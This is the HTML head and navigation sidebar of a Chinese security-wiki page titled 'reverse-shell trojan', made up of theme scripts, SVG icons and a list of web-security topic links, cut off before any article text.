<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="generator" content="VuePress 2.0.0-beta.61">
    <script>
      (function() {
        const userMode = localStorage.getItem('vuepress-reco-color-scheme') || 'auto';
        const systemDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;

        if (userMode === 'dark' || (userMode === 'auto' && systemDarkMode)) {
          document.documentElement.classList.toggle('dark', true);
        }
      })();
    </script>
    <link rel="icon" href="/icons/logo.ico"><title>反弹木马 | 枫-WIKI</title><meta name="description" content="">
    <link rel="modulepreload" href="/assets/app-83ee7d39.js"><link rel="modulepreload" href="/assets/framework-47a2e622.js"><link rel="modulepreload" href="/assets/bounceTrojan.html-33ba4e17.js"><link rel="modulepreload" href="/assets/bounceTrojan.html-c40e4a0b.js">
    <link rel="preload" href="/assets/style-7191e930.css" as="style"><link rel="stylesheet" href="/assets/style-7191e930.css">
  </head>
  <body>
    <div id="app"><!--[--><div class="theme-container"><!-- <ReadingProgress /> --><div class="theme-container-bar"><div class="theme-container-bar-time">00:00</div><div class="theme-container-bar-ampm">上午</div><div class="theme-container-bar-day">周一</div><div class="theme-container-bar-md">1月1日</div><div class="theme-container-bar-battery"><div class="battery-container"><!--[--><div class="battery-level"></div><div class="battery"></div><!----><!--]--></div></div><div class="theme-container-bar-site"><div class="theme-container-bar-site-name">枫-WIKI</div></div></div><!----><div class="common-wrapper show-series series-collapsed show-catalog"><div class="wiki-container"><!-- <Navbar @toggleSeries="toggleSeries" @toggleMenus="toggleMobileMenus" /> --><!-- <NavbarDropdownNemu /> --><!----><!--[--><aside class="series-container"><div class="series-container-bar"><div class="site-brand"><a href="/" class="site-name can-hide"><img class="logo" src="/icons/logo.png" alt="枫-WIKI"><!-- {{ siteBrandTitle }} --></a></div><hr><button class="series-container-bar-button toggle-series" aria-label="展开面板"><div><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="512px" height="512px"><path fill="#50e6ff" d="M14,41c0,0.552,0.448,1,1,1h25c1.105,0,2-0.895,2-2V8c0-1.105-0.895-2-2-2H15c-0.552,0-1,0.448-1,1	V41z"></path><linearGradient id="aF6QZjBsa_n2UXgxFd1v9a" x1="25.465" x2="4.018" y1="41.195" y2="10.429" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#1951a8"></stop><stop offset=".175" stop-color="#1955b0"></stop><stop offset=".505" stop-color="#195ab9"></stop><stop offset="1" stop-color="#195bbc"></stop></linearGradient><path fill="url(#aF6QZjBsa_n2UXgxFd1v9a)" d="M20,6H8C6.895,6,6,6.895,6,8v32c0,1.105,0.895,2,2,2h12V6z"></path><linearGradient id="aF6QZjBsa_n2UXgxFd1v9b" x1="8.298" x2="11.154" y1="8.298" y2="11.154" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#ffc430"></stop><stop offset=".41" stop-color="#fec130"></stop><stop offset=".72" stop-color="#fcb730"></stop><stop offset=".998" stop-color="#f7a72f"></stop><stop offset="1" stop-color="#f7a72f"></stop></linearGradient><path fill="url(#aF6QZjBsa_n2UXgxFd1v9b)" d="M10,8c-1.105,0-2,0.895-2,2s0.895,2,2,2s2-0.895,2-2S11.105,8,10,8z"></path><linearGradient id="aF6QZjBsa_n2UXgxFd1v9c" x1="14.282" x2="17.131" y1="8.282" y2="11.131" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#9dffce"></stop><stop offset="1" stop-color="#50d18d"></stop></linearGradient><path fill="url(#aF6QZjBsa_n2UXgxFd1v9c)" d="M16,8c-1.105,0-2,0.895-2,2s0.895,2,2,2s2-0.895,2-2S17.105,8,16,8z"></path><linearGradient id="aF6QZjBsa_n2UXgxFd1v9d" x1="8" x2="18" y1="15" y2="15" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#7dd8f3"></stop><stop offset="1" stop-color="#45b0d0"></stop></linearGradient><path fill="url(#aF6QZjBsa_n2UXgxFd1v9d)" d="M17.5,16h-9C8.224,16,8,15.776,8,15.5v-1C8,14.224,8.224,14,8.5,14h9	c0.276,0,0.5,0.224,0.5,0.5v1C18,15.776,17.776,16,17.5,16z"></path></svg></div></button><hr><button class="active series-container-bar-button navbar-button" aria-label="导航栏"><div><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="512px" height="512px"><linearGradient id="DzMuE_jJEFksaBs1DD40ca" x1="35" x2="42" y1="24" y2="24" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#7f22e2"></stop><stop offset="1" stop-color="#b133f0"></stop></linearGradient><path fill="url(#DzMuE_jJEFksaBs1DD40ca)" d="M42,7v34c0,1.105-0.895,2-2,2h-5V5h5C41.105,5,42,5.895,42,7z"></path><linearGradient id="DzMuE_jJEFksaBs1DD40cb" x1="731.856" x2="731.856" y1="-90.305" y2="-87.163" gradientTransform="rotate(-90 441.067 314.79)" gradientUnits="userSpaceOnUse"><stop offset=".441" stop-color="#999998"></stop><stop offset=".653" stop-color="#c1c1c0"></stop><stop offset=".88" stop-color="#e5e5e5"></stop><stop offset="1" stop-color="#f3f3f3"></stop></linearGradient><path fill="url(#DzMuE_jJEFksaBs1DD40cb)" d="M40,7v34c0,1.105-0.895,2-2,2h-6V5h6C39.105,5,40,5.895,40,7z"></path><linearGradient id="DzMuE_jJEFksaBs1DD40cc" x1="9.47" x2="20.824" y1="9.476" y2="40.407" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#6f01d0"></stop><stop offset="1" stop-color="#51189c"></stop></linearGradient><path fill="url(#DzMuE_jJEFksaBs1DD40cc)" d="M13,7v34c0,1.105,0.895,2,2,2h1V5h-1C13.895,5,13,5.895,13,7z"></path><linearGradient id="DzMuE_jJEFksaBs1DD40cd" x1="20.266" x2="33.678" y1="6.478" y2="43.013" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#b133f0"></stop><stop offset="1" stop-color="#9f22e2"></stop></linearGradient><path fill="url(#DzMuE_jJEFksaBs1DD40cd)" d="M36,5H16v38h20c1.105,0,2-0.895,2-2V7C38,5.895,37.105,5,36,5z"></path><path d="M31.319,9H13v34h18.319C33.352,43,35,41.352,35,39.319V12.681C35,10.648,33.352,9,31.319,9z" opacity=".05"></path><path d="M31.161,10H13v33h18.161C32.729,43,34,41.729,34,40.161V12.839C34,11.271,32.729,10,31.161,10z" opacity=".07"></path><path fill="#1783bd" d="M33,13v28c0,1.105-0.895,2-2,2h-5V11h5C32.105,11,33,11.895,33,13z"></path><linearGradient id="DzMuE_jJEFksaBs1DD40ce" x1="728.856" x2="728.856" y1="-99.305" y2="-96.163" gradientTransform="rotate(-90 441.067 314.79)" gradientUnits="userSpaceOnUse"><stop offset=".441" stop-color="#999998"></stop><stop offset=".653" stop-color="#c1c1c0"></stop><stop offset=".88" stop-color="#e5e5e5"></stop><stop offset="1" stop-color="#f3f3f3"></stop></linearGradient><path fill="url(#DzMuE_jJEFksaBs1DD40ce)" d="M31,13v28c0,1.105-0.895,2-2,2h-6V11h6C30.105,11,31,11.895,31,13z"></path><linearGradient id="DzMuE_jJEFksaBs1DD40cf" x1="3.31" x2="12.895" y1="14.766" y2="40.876" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#0176d0"></stop><stop offset="1" stop-color="#16538c"></stop></linearGradient><path fill="url(#DzMuE_jJEFksaBs1DD40cf)" d="M6,13v28c0,1.105,0.895,2,2,2h1V11H8C6.895,11,6,11.895,6,13z"></path><linearGradient id="DzMuE_jJEFksaBs1DD40cg" x1="13.21" x2="24.635" y1="12.047" y2="43.172" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#33bef0"></stop><stop offset="1" stop-color="#22a5e2"></stop></linearGradient><path fill="url(#DzMuE_jJEFksaBs1DD40cg)" d="M27,11H9v32h18c1.105,0,2-0.895,2-2V13C29,11.895,28.105,11,27,11z"></path><rect width="10" height="2" x="14" y="21" fill="#1b9de2"></rect></svg></div></button><button class="series-container-bar-button seriesItem-button" aria-label="目录列表"><div><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="512px" height="512px"><linearGradient id="_XE7wcyLqYisWKufxCDQLa" x1="24" x2="24" y1="35.934" y2="41.432" gradientUnits="userSpaceOnUse"><stop offset=".435" stop-color="#382010"></stop><stop offset="1" stop-color="#b0622b"></stop></linearGradient><path fill="url(#_XE7wcyLqYisWKufxCDQLa)" d="M37,43H11c-1.105,0-2-0.895-2-2V29h30v12C39,42.105,38.105,43,37,43z"></path><linearGradient id="_XE7wcyLqYisWKufxCDQLb" x1="24" x2="24" y1="33.455" y2="38.561" gradientUnits="userSpaceOnUse"><stop offset=".441" stop-color="#999998"></stop><stop offset=".653" stop-color="#c1c1c0"></stop><stop offset=".88" stop-color="#e5e5e5"></stop><stop offset="1" stop-color="#f3f3f3"></stop></linearGradient><path fill="url(#_XE7wcyLqYisWKufxCDQLb)" d="M37,40H11c-1.105,0-2-0.895-2-2V27h30v11C39,39.105,38.105,40,37,40z"></path><linearGradient id="_XE7wcyLqYisWKufxCDQLc" x1="9.499" x2="37.735" y1="6.118" y2="36.071" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#7dd8f3"></stop><stop offset="1" stop-color="#45b0d0"></stop></linearGradient><path fill="url(#_XE7wcyLqYisWKufxCDQLc)" d="M37,37H11c-1.105,0-2-0.895-2-2V8c0-1.105,0.895-2,2-2h26c1.105,0,2,0.895,2,2v27 C39,36.105,38.105,37,37,37z"></path><path fill="#057093" d="M34.5,19h-21c-0.276,0-0.5-0.224-0.5-0.5v-2c0-0.276,0.224-0.5,0.5-0.5h21c0.276,0,0.5,0.224,0.5,0.5 v2C35,18.776,34.776,19,34.5,19z"></path><path fill="#057093" d="M34.5,25h-21c-0.276,0-0.5-0.224-0.5-0.5v-2c0-0.276,0.224-0.5,0.5-0.5h21c0.276,0,0.5,0.224,0.5,0.5 v2C35,24.776,34.776,25,34.5,25z"></path><path fill="#057093" d="M34.5,31h-21c-0.276,0-0.5-0.224-0.5-0.5v-2c0-0.276,0.224-0.5,0.5-0.5h21c0.276,0,0.5,0.224,0.5,0.5 v2C35,30.776,34.776,31,34.5,31z"></path><path fill="#057093" d="M34.5,9L34.5,9C33.672,9,33,8.328,33,7.5v-2C33,4.672,33.672,4,34.5,4l0,0C35.328,4,36,4.672,36,5.5 v2C36,8.328,35.328,9,34.5,9z"></path><path fill="#057093" d="M27.5,9L27.5,9C26.672,9,26,8.328,26,7.5v-2C26,4.672,26.672,4,27.5,4h0C28.328,4,29,4.672,29,5.5v2 C29,8.328,28.328,9,27.5,9z"></path><path fill="#057093" d="M20.5,9L20.5,9C19.672,9,19,8.328,19,7.5v-2C19,4.672,19.672,4,20.5,4h0C21.328,4,22,4.672,22,5.5v2 C22,8.328,21.328,9,20.5,9z"></path><path fill="#057093" d="M13.5,9L13.5,9C12.672,9,12,8.328,12,7.5v-2C12,4.672,12.672,4,13.5,4h0C14.328,4,15,4.672,15,5.5v2 C15,8.328,14.328,9,13.5,9z"></path></svg></div></button><button class="series-container-bar-button catalog-button" aria-label="文章大纲"><div><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="512px" height="512px"><path fill="#50e6ff" d="M39,16v25c0,1.105-0.895,2-2,2H11c-1.105,0-2-0.895-2-2V7c0-1.105,0.895-2,2-2h17L39,16z"></path><linearGradient id="wPoVdSo2M_qKZ6mufucFra" x1="28.529" x2="33.6" y1="510.528" y2="515.6" gradientTransform="matrix(1 0 0 -1 0 526)" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#3079d6"></stop><stop offset="1" stop-color="#297cd2"></stop></linearGradient><path fill="url(#wPoVdSo2M_qKZ6mufucFra)" d="M28,5v9c0,1.105,0.895,2,2,2h9L28,5z"></path><path fill="#057093" d="M33.5,24h-15c-0.276,0-0.5-0.224-0.5-0.5v-1c0-0.276,0.224-0.5,0.5-0.5h15 c0.276,0,0.5,0.224,0.5,0.5v1C34,23.776,33.776,24,33.5,24z"></path><path fill="#057093" d="M25.5,16h-11c-0.276,0-0.5-0.224-0.5-0.5v-3c0-0.276,0.224-0.5,0.5-0.5h11 c0.276,0,0.5,0.224,0.5,0.5v3C26,15.776,25.776,16,25.5,16z"></path><path fill="#057093" d="M15.5,24h-1c-0.276,0-0.5-0.224-0.5-0.5v-1c0-0.276,0.224-0.5,0.5-0.5h1c0.276,0,0.5,0.224,0.5,0.5 v1C16,23.776,15.776,24,15.5,24z"></path><path fill="#057093" d="M31.5,28h-13c-0.276,0-0.5-0.224-0.5-0.5v-1c0-0.276,0.224-0.5,0.5-0.5h13 c0.276,0,0.5,0.224,0.5,0.5v1C32,27.776,31.776,28,31.5,28z"></path><path fill="#057093" d="M15.5,28h-1c-0.276,0-0.5-0.224-0.5-0.5v-1c0-0.276,0.224-0.5,0.5-0.5h1c0.276,0,0.5,0.224,0.5,0.5 v1C16,27.776,15.776,28,15.5,28z"></path><path fill="#057093" d="M33.5,32h-15c-0.276,0-0.5-0.224-0.5-0.5v-1c0-0.276,0.224-0.5,0.5-0.5h15 c0.276,0,0.5,0.224,0.5,0.5v1C34,31.776,33.776,32,33.5,32z"></path><path fill="#057093" d="M15.5,32h-1c-0.276,0-0.5-0.224-0.5-0.5v-1c0-0.276,0.224-0.5,0.5-0.5h1c0.276,0,0.5,0.224,0.5,0.5 v1C16,31.776,15.776,32,15.5,32z"></path><path fill="#057093" d="M31.5,36h-13c-0.276,0-0.5-0.224-0.5-0.5v-1c0-0.276,0.224-0.5,0.5-0.5h13 c0.276,0,0.5,0.224,0.5,0.5v1C32,35.776,31.776,36,31.5,36z"></path><path fill="#057093" d="M15.5,36h-1c-0.276,0-0.5-0.224-0.5-0.5v-1c0-0.276,0.224-0.5,0.5-0.5h1c0.276,0,0.5,0.224,0.5,0.5 v1C16,35.776,15.776,36,15.5,36z"></path></svg></div></button><hr><div class="btn--dark-mode"><div class="btn-toggle-dark-mode"><div><svg xml:space="preserve" viewBox="0 0 100 100" y="0" x="0" xmlns="http://www.w3.org/2000/svg" id="" version="1.1" style="height:100%;width:100%;background:rgb(255, 255, 255, 0);" width="20px" height="20px"><g class="ldl-scale" style="transform-origin:50% 50%;transform:rotate(0deg) scale(1, 1);"><g class="ldl-ani"><g class="ldl-layer"><g class="ldl-ani" style="transform-origin:50px 50px;animation:1.11111s linear -0.833333s infinite normal forwards running static-fdeef450-e1af-4b38-82c5-87146883ab50;"><circle fill="#ffdc6c" r="34.5" cy="50" cx="50.5" style="fill:rgb(255, 220, 108);"></circle></g></g><g class="ldl-layer"><g class="ldl-ani" style="transform-origin:50px 50px;animation:1.11111s linear -1.11111s infinite normal forwards running static-fdeef450-e1af-4b38-82c5-87146883ab50;"><path stroke-miterlimit="10" stroke-width="3" stroke="#fff" fill="#e0e0e0" d="M38.3 74.8h-1.4c-2 0-3.7-1.5-3.7-3.5 0 0 0 0 0 0s0 0 0 0c0-2 1.7-3.5 3.7-3.5h34.8c3.2 0 6-2.5 6.1-5.7.1-3.3-2.6-6.1-5.9-6.1h-53-.1c-1.4 0-2.8.5-3.8 1.4-1.3 1-2.2 2.6-2.2 4.4-.1 3.3 2.6 6.1 5.9 6.1H21.8c1.1 0 2.1.5 2.8 1.3.1.1.2.3.3.4.3.5.5 1.1.5 1.8 0 0 0 0 0 0s0 0 0 0c0 1.4-.5 2.6-1.5 3.2-.4.2-.8.3-1.3.3h-1.2c-3.2 0-6 2.5-6.1 5.7-.1 3.3 2.6 6.1 5.9 6.1h17c1.4 0 2.7-.5 3.8-1.3 1.1-.9 2-2.1 2.2-3.6.1-.3.1-.6.1-.8 0-3.5-2.7-6.2-6-6.2z" style="stroke:rgb(255, 255, 255);fill:rgb(224, 224, 224);"></path></g></g><metadata xmlns:d="https://loading.io/stock/"></metadata></g></g></svg></div><!----><!----></div></div><div class="full-screen-container"><div class="full-screen-button"><div><svg t="1687420127564" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="14362" width="100%" height="100%"><path d="M716.5 853.4H316.1c-77.6 0-140.7-63.1-140.7-140.7V312.3c0-77.6 63.1-140.7 140.7-140.7h400.4c77.6 0 140.7 63.1 140.7 140.7v400.4c0.1 77.6-63.1 140.7-140.7 140.7zM316.1 267.7c-24.6 0-44.6 20-44.6 44.6v400.4c0 24.6 20 44.6 44.6 44.6h400.4c24.6 0 44.6-20 44.6-44.6V312.3c0-24.6-20-44.6-44.6-44.6H316.1z" fill="#BDD2EF" p-id="14363"></path><path d="M192.1 895.3h232.1c32.5 0 58.8-26.3 58.8-58.8 0-32.4-26.3-58.8-58.8-58.8H334L463.7 648c22.9-22.9 22.9-60.2 0-83.1-22.9-22.9-60.2-22.9-83.1 0L250.9 694.7v-90.2c0-16.2-6.6-30.9-17.2-41.5-10.6-10.6-25.3-17.2-41.5-17.2-32.5 0-58.8 26.3-58.8 58.8v232.1c-0.1 32.3 26.3 58.6 58.7 58.6zM835.9 131.1H603.8c-32.5 0-58.8 26.3-58.8 58.8 0 32.4 26.3 58.8 58.8 58.8H694L564.3 378.3c-22.9 22.9-22.9 60.2 0 83.1 22.9 22.9 60.2 22.9 83.1 0l129.7-129.7v90.2c0 16.2 6.6 30.9 17.2 41.5 10.6 10.6 25.3 17.2 41.5 17.2 32.5 0 58.8-26.3 58.8-58.8V189.9c0.1-32.5-26.3-58.8-58.7-58.8z" fill="#2867CE" p-id="14364"></path></svg></div><!----></div></div></div><div class="series-items-container"><div class="series-items-search"><!--[--><div id="docsearch-container" style="display:none;"></div><div><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索文档"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索文档</span></span><span class="DocSearch-Button-Keys"><kbd class="DocSearch-Button-Key"><svg width="15" height="15" class="DocSearch-Control-Key-Icon"><path d="M4.505 4.496h2M5.505 5.496v5M8.216 4.496l.055 5.993M10 7.5c.333.333.5.667.5 1v2M12.326 4.5v5.996M8.384 4.496c1.674 0 2.116 0 2.116 1.5s-.442 1.5-2.116 1.5M3.205 9.303c-.09.448-.277 1.21-1.241 1.203C1 10.5.5 9.513.5 8V7c0-1.57.5-2.5 1.464-2.494.964.006 1.134.598 1.24 1.342M12.553 10.5h1.953" stroke-width="1.2" stroke="currentColor" fill="none" stroke-linecap="square"></path></svg></kbd><kbd class="DocSearch-Button-Key">K</kbd></span></button></div><!--]--></div><span class="series-items-lable">导航栏</span><div style=""><nav class="navbar-links" id="navbar-web"><!--[--><div class="navbar-links__item"><a href="/docs/NetworkSecurity/" class="link router-link-active" aria-label="网络安全"><!--[--><!--]--><div class="iconE-container"><img src="/icons/网络安全.svg" class="item-icon" alt="item-icon"><!----><span class="iconE-text">网络安全</span></div><!--[--><!--]--></a></div><div class="navbar-links__item"><a href="/docs/SecurityTools/" class="link" aria-label="安全工具"><!--[--><!--]--><div class="iconE-container"><img src="/icons/安全工具.svg" class="item-icon" alt="item-icon"><!----><span class="iconE-text">安全工具</span></div><!--[--><!--]--></a></div><div class="navbar-links__item"><a href="/docs/ProgrammingLearning/" class="link" aria-label="编程学习"><!--[--><!--]--><div class="iconE-container"><img src="/icons/编程学习.svg" class="item-icon" alt="item-icon"><!----><span class="iconE-text">编程学习</span></div><!--[--><!--]--></a></div><div class="navbar-links__item"><a href="/docs/CodeAudit/" class="link" aria-label="代码审计"><!--[--><!--]--><div class="iconE-container"><img src="/icons/代码审计.svg" class="item-icon" alt="item-icon"><!----><span class="iconE-text">代码审计</span></div><!--[--><!--]--></a></div><div class="navbar-links__item"><a href="/docs/VulnerabilityLibrary/" class="link" aria-label="漏洞文库"><!--[--><!--]--><div class="iconE-container"><img src="/icons/漏洞文库.svg" class="item-icon" alt="item-icon"><!----><span class="iconE-text">漏洞文库</span></div><!--[--><!--]--></a></div><div class="navbar-links__item"><a href="/docs/MessageSection/" class="link" aria-label="留言板块"><!--[--><!--]--><div class="iconE-container"><img src="/icons/留言板块.svg" class="item-icon" alt="item-icon"><!----><span class="iconE-text">留言板块</span></div><!--[--><!--]--></a></div><!--]--></nav></div><div style="display:none;"><!--[--><!--[--><section class="series-group series-item"><h5 class="series-heading active"><img style="display:inline-flex;" class="item-icon" src="/icons/WEB安全.svg" alt="item-icon"><span class="series-item-text">WEB安全</span><span class="arrow right"></span></h5><ul id="1" style="height:0rem;"><li><!--[--><section class="series-group series-item"><h5 class="series-heading"><img style="display:inline-flex;" class="item-icon" src="/icons/常见漏洞.svg" alt="item-icon"><span class="series-item-text">常见漏洞</span><span class="arrow right"></span></h5><ul id="1.0" style="height:0rem;"><li><!--[--><a href="/docs/NetworkSecurity/WebSecurity/CommonVulnerabilities/bruteForce.html" class="link series-item" aria-label="暴力破解攻击"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->暴力破解攻击<!--]--></span></span><!--[--><!--]--></a><!--]--></li><li><!--[--><a href="/docs/NetworkSecurity/WebSecurity/CommonVulnerabilities/logicalVulnerability.html" class="link series-item" aria-label="逻辑越权漏洞"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->逻辑越权漏洞<!--]--></span></span><!--[--><!--]--></a><!--]--></li><li><!--[--><a href="/docs/NetworkSecurity/WebSecurity/CommonVulnerabilities/XSS.html" class="link series-item" aria-label="跨站脚本攻击"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->跨站脚本攻击<!--]--></span></span><!--[--><!--]--></a><!--]--></li><li><!--[--><a href="/docs/NetworkSecurity/WebSecurity/CommonVulnerabilities/CSRF.html" class="link series-item" aria-label="跨站请求伪造"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->跨站请求伪造<!--]--></span></span><!--[--><!--]--></a><!--]--></li><li><!--[--><a href="/docs/NetworkSecurity/WebSecurity/CommonVulnerabilities/RCE.html" class="link series-item" aria-label="命令执行漏洞"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->命令执行漏洞<!--]--></span></span><!--[--><!--]--></a><!--]--></li><li><!--[--><a href="/docs/NetworkSecurity/WebSecurity/CommonVulnerabilities/deserialize.html" class="link series-item" aria-label="反序列化漏洞"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->反序列化漏洞<!--]--></span></span><!--[--><!--]--></a><!--]--></li><li><!--[--><a href="/docs/NetworkSecurity/WebSecurity/CommonVulnerabilities/LFR.html" class="link series-item" aria-label="任意文件读取"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->任意文件读取<!--]--></span></span><!--[--><!--]--></a><!--]--></li><li><!--[--><a href="/docs/NetworkSecurity/WebSecurity/CommonVulnerabilities/LFU.html" class="link series-item" aria-label="任意文件上传"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->任意文件上传<!--]--></span></span><!--[--><!--]--></a><!--]--></li><li><!--[--><a href="/docs/NetworkSecurity/WebSecurity/CommonVulnerabilities/SQLI.html" class="link series-item" aria-label="SQL 注入漏洞"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->SQL 注入漏洞<!--]--></span></span><!--[--><!--]--></a><!--]--></li><li><!--[--><a href="/docs/NetworkSecurity/WebSecurity/CommonVulnerabilities/XXE.html" class="link series-item" aria-label="XML 实体注入"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->XML 实体注入<!--]--></span></span><!--[--><!--]--></a><!--]--></li></ul></section><!--]--></li><li><!--[--><section class="series-group series-item"><h5 class="series-heading active"><img style="display:inline-flex;" class="item-icon" src="/icons/安全技术.svg" alt="item-icon"><span class="series-item-text">安全技术</span><span class="arrow right"></span></h5><ul id="1.1" style="height:0rem;"><li><!--[--><a href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/informationGathering.html" class="link series-item" aria-label="信息收集"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->信息收集<!--]--></span></span><!--[--><!--]--></a><!--]--></li><li><!--[--><a href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/socialEngineering.html" class="link series-item" aria-label="社会工程"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->社会工程<!--]--></span></span><!--[--><!--]--></a><!--]--></li><li><!--[--><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html" class="router-link-active router-link-exact-active link router-link-active series-item active" aria-label="反弹木马"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->反弹木马<!--]--></span></span><!--[--><!--]--></a><!--]--></li></ul></section><!--]--></li><li><!--[--><section class="series-group series-item"><h5 class="series-heading"><img style="display:inline-flex;" class="item-icon" src="/icons/基础知识.svg" alt="item-icon"><span class="series-item-text">基础知识</span><span class="arrow right"></span></h5><ul id="1.2" style="height:0rem;"><li><!--[--><a href="/docs/NetworkSecurity/WebSecurity/BasicKnowledge/cookie.html" class="link series-item" aria-label="会话存储"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->会话存储<!--]--></span></span><!--[--><!--]--></a><!--]--></li></ul></section><!--]--></li><li><!--[--><section class="series-group series-item"><h5 class="series-heading"><img style="display:inline-flex;" class="item-icon" src="/icons/网络协议.svg" alt="item-icon"><span class="series-item-text">网络协议</span><span class="arrow right"></span></h5><ul id="1.3" style="height:0rem;"><li><!--[--><a href="/docs/NetworkSecurity/WebSecurity/NetworkProtocol/HTTP.html" class="link series-item" aria-label="HTTP"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->HTTP<!--]--></span></span><!--[--><!--]--></a><!--]--></li></ul></section><!--]--></li></ul></section><!--]--><!--[--><section class="series-group series-item"><h5 class="series-heading"><img style="display:inline-flex;" class="item-icon" src="/icons/内网安全.svg" alt="item-icon"><span class="series-item-text">内网安全</span><span class="arrow right"></span></h5><ul id="2" style="height:0rem;"><li><!--[--><section class="series-group series-item"><h5 class="series-heading"><img style="display:inline-flex;" class="item-icon" src="/icons/Linux.svg" alt="item-icon"><span class="series-item-text">Linux</span><span class="arrow right"></span></h5><ul id="2.0" style="height:0rem;"><li><!--[--><a href="/docs/NetworkSecurity/IntranetSecurity/Linux/permissionEscalation.html" class="link series-item" aria-label="权限提升"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->权限提升<!--]--></span></span><!--[--><!--]--></a><!--]--></li></ul></section><!--]--></li><li><!--[--><section class="series-group series-item"><h5 class="series-heading"><img style="display:inline-flex;" class="item-icon" src="/icons/Windows.svg" alt="item-icon"><span class="series-item-text">Windows</span><span class="arrow right"></span></h5><ul id="2.1" style="height:0rem;"><li><!--[--><a href="/docs/NetworkSecurity/IntranetSecurity/Windows/informationGathering.html" class="link series-item" aria-label="信息收集"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->信息收集<!--]--></span></span><!--[--><!--]--></a><!--]--></li><li><!--[--><a href="/docs/NetworkSecurity/IntranetSecurity/Windows/permissionEscalation.html" class="link series-item" aria-label="权限提升"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->权限提升<!--]--></span></span><!--[--><!--]--></a><!--]--></li></ul></section><!--]--></li></ul></section><!--]--><!--[--><section class="series-group series-item"><h5 class="series-heading"><img style="display:inline-flex;" class="item-icon" src="/icons/运营安全.svg" alt="item-icon"><span class="series-item-text">运营安全</span><span class="arrow right"></span></h5><ul id="3" style="height:0rem;"><li><!--[--><a href="/docs/NetworkSecurity/OperationalSecurity/SDLC.html" class="link series-item" aria-label="安全生产"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->安全生产<!--]--></span></span><!--[--><!--]--></a><!--]--></li><li><!--[--><a href="/docs/NetworkSecurity/OperationalSecurity/riskAssessment.html" class="link series-item" aria-label="风险评估"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->风险评估<!--]--></span></span><!--[--><!--]--></a><!--]--></li><li><!--[--><a href="/docs/NetworkSecurity/OperationalSecurity/equalProtectionEvaluation.html" class="link series-item" aria-label="等保测评"><!--[--><!--]--><span class="xicon-container 